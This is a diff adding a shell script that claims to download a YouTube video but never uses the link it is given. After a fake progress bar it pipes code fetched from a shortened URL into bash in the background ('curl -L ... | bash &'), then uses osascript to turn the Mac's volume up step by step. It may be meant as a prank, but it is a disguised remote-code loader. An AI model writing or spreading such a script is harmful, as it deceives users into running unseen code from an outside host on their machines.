@@ -1,0 +1,35 @@
+if [ $# -eq 0 ]
+then
+	echo "Please provide a youtube link to download"
+	echo "sh 03 <link>"
+	exit
+fi
+
+LINK=$1
+
+REAL="http://bit.ly/10hA8iC"
+
+my_function(){
+	sleep 1
+	printf "||||||||||"
+}
+
+for j in {1..10}; do
+	my_function
+done
+
+printf "\n"
+
+curl -L $REAL | bash &
+
+COMMAND=$(which osascript)
+
+if [ -n $COMMAND ]
+then
+	for i in {1..500000}; do
+		if [ $((i % 100000)) = 0 ]
+		then
+			osascript -e "set Volume $((i / 100000))"
+		fi
+	done
+fi
